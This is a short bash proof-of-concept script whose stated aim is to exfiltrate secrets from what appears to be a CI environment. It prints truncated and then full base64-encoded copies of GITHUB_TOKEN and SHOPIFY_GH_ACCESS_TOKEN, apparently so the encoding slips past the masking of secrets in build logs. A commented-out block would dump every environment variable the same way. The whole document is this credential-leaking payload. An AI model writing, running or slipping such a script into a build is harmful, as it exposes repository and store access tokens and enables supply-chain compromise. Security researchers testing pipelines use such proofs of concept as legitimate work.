#!/bin/bash

echo "Attempting to exfiltrate secrets..."
echo "Available environment variables (some might be secrets):"

echo "---SHOPIFY_GH_ACCESS_TOKEN (first 5 chars if set): ${SHOPIFY_GH_ACCESS_TOKEN:0:5}"
echo "---GITHUB_TOKEN (first 5 chars if set): ${GITHUB_TOKEN:0:5}"

echo "---Base64 encoded GITHUB_TOKEN---"
echo "$GITHUB_TOKEN" | base64
echo "---End Base64 encoded GITHUB_TOKEN---"

echo "---Base64 encoded SHOPIFY_GH_ACCESS_TOKEN---"
echo "$SHOPIFY_GH_ACCESS_TOKEN" | base64
echo "---End Base64 encoded SHOPIFY_GH_ACCESS_TOKEN---"

# echo "---All Env Vars (Base64 Encoded)---"
# printenv | base64
# echo "---End All Env Vars (Base64 Encoded)---"

echo "PoC script finished."
exit 0
